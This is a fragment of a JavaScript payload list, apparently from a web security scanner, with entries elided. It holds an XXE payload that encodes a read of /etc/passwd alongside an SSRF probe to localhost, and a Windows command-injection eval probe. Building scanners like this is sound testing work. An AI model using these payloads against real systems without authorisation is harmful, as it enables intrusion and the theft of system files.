export const payloads = [
   ...
   },
   {
      ...
      parentId: 'xxe',
      payload:
         '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>SSRFhttp://127.0.0.1:80',
   },
   {
      id: '90',
      parentId: 'ssrf',
   ...
   },
   {
      ...
      parentId: 'command-injection-windows',
      payload:
         "eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')",
   },
   {
      id: '179',
      parentId: 'command-injection-windows',
